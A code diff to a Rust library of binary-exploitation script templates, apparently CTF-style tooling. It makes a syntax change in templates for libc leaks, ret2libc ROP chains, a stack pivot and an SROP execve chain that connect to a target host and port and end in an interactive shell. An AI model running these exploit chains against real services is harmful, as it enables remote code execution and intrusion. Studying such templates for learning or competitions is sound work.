@@ -1,3 +1,5 @@
+#![allow(dead_code)]
+
 pub struct OneLinerLibrary;
 
 impl OneLinerLibrary {
@@ -65,8 +67,8 @@ print("Leaked address: 0x" + hex(leaked_addr))
 let matches = libc_search("puts", leaked_addr)
 if len(matches) > 0 {{
     let libc = matches[0]
-    print("Found libc: " + libc["id"])
-    let libc_base = leaked_addr - libc["symbols"]["puts"]
+    print("Found libc: " + libc.id)
+    let libc_base = leaked_addr - libc.symbols["puts"]
     print("libc base @ 0x" + hex(libc_base))
 }}"#,
             target, port
@@ -78,8 +80,8 @@ if len(matches) > 0 {{
             r#"let s = connect("{}", {})
 let binary = "./vuln"
 
-let pop_rdi = rop_find(binary, "pop rdi; ret")[0]["address"]
-let ret = rop_find(binary, "ret")[0]["address"]
+let pop_rdi = rop_find(binary, "pop rdi; ret")[0].address
+let ret = rop_find(binary, "ret")[0].address
 
 let leaked_addr = u64(recv(s, 8))
 let libc_base = leaked_addr - 0x809c0
@@ -105,7 +107,7 @@ print("Buffer offset: " + str(offset))
 let puts_plt = find_symbol(binary, "puts", section: "plt")
 let puts_got = find_symbol(binary, "puts", section: "got")
 let main_addr = find_symbol(binary, "main")
-let pop_rdi = rop_find(binary, "pop rdi; ret")[0]["address"]
+let pop_rdi = rop_find(binary, "pop rdi; ret")[0].address
 
 let payload1 = "A" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
 send(s, payload1)
@@ -175,8 +177,8 @@ interactive(s)"#,
             r#"let s = connect("{}", {})
 let binary = "./vuln"
 
-let bss_addr = find_section(binary, ".bss")["address"] + 0x800
-let pop_rsp = rop_find(binary, "pop rsp; ret")[0]["address"]
+let bss_addr = find_section(binary, ".bss").address + 0x800
+let pop_rsp = rop_find(binary, "pop rsp; ret")[0].address
 
 let rop_chain = [
     pop_rdi_addr,
@@ -198,8 +200,8 @@ interactive(s)"#,
             r#"let s = connect("{}", {})
 let binary = "./vuln"
 
-let syscall_ret = rop_find(binary, "syscall; ret")[0]["address"]
-let pop_rax = rop_find(binary, "pop rax; ret")[0]["address"]
+let syscall_ret = rop_find(binary, "syscall; ret")[0].address
+let pop_rax = rop_find(binary, "pop rax; ret")[0].address
 
 let frame = sigreturn_frame({{
     "rax": 59,
